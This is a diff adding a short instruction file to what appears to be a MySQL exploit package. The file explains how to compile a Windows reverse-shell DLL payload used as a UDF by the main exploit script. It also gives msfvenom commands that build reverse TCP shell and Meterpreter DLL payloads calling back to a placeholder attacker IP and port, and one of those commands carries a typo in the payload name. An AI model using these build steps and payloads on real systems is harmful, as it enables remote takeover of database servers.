@@ -1,0 +1,17 @@
+
+payload.c => Windows Reverse Shell
+Borrowed from Kingcope MySQL Jackpot Exploit Package
+
+To Compile reverse_udf.c windows reverse command shell payload, do this:
+  change REVERSEIP and REVERSEPORT to suit your needs in payload.c
+    use mingw on windows or wine to compile & issue these commands:
+      set PATH=%PATH%;c:\MinGW\bin\
+      gcc -c reverse_udf.c
+      gcc -shared -o reverse_udf.dll reverse_udf.o -lws2_32
+    Copy the reverse_udf.dll which results from above into this payload folder
+     it will then be available to the main exploit script :)
+
+You can alternatively create a DLL reverse payload with MSF:
+   CMD Reverse Shell: msfvenom -p windows/shell/reverse_tcp LHOST=YOURIPHERE LPORT=4444 -f dll > /path/to/here/payloads/reverse_udf.dll
+   Reverse Metererpreter: msfvenom -p windows/meterpreter/reverse_tcpp LHOST=YOURIPHERE LPORT=4444 -f dll > /path/to/payloads/reverse_udf.dll
+
